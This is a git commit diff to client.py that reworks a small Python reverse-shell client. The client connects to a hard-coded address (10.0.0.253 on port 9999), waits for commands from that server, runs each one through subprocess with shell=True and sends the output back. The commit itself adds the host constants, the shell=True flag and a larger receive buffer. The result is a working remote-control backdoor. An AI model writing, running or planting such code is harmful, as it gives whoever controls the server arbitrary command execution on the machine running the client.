ed93993325080f903420efcf6db75445f1db36c7
michaelnkr808 <226908033+michaelnkr808@users.noreply.github.com>
2025-08-29 20:50:54 -0700

    Pass s as a parameter to execute_command

--- client.py
+++ client.py
@@ -2,13 +2,16 @@ import socket
 import time
 import subprocess
 
+HOST = "10.0.0.253"
+PORT = 9999
+
 def server_connect():
     s = socket.socket()
-    s.connect(("serverip", 9999))
+    s.connect((HOST, PORT))
     return s
 
-def execute_command(command):
-    result = subprocess.run(command, capture_output = True, text=True)
+def execute_command(s, command):
+    result = subprocess.run(command, capture_output = True, text=True, shell=True)
     output = result.stdout if result.stdout else result.stderr
     s.send(output.encode())
 
@@ -16,9 +19,9 @@ s = server_connect()
 
 while True:
     try:
-        msg = s.recv(1024)
+        msg = s.recv(4096)
         command = msg.decode("utf-8")
-        execute_command(command)
+        execute_command(s, command)
     except socket.error as error_msg:
         print("An Unexpected Connection Error Occured: " + str(error_msg))
         time.sleep(5)
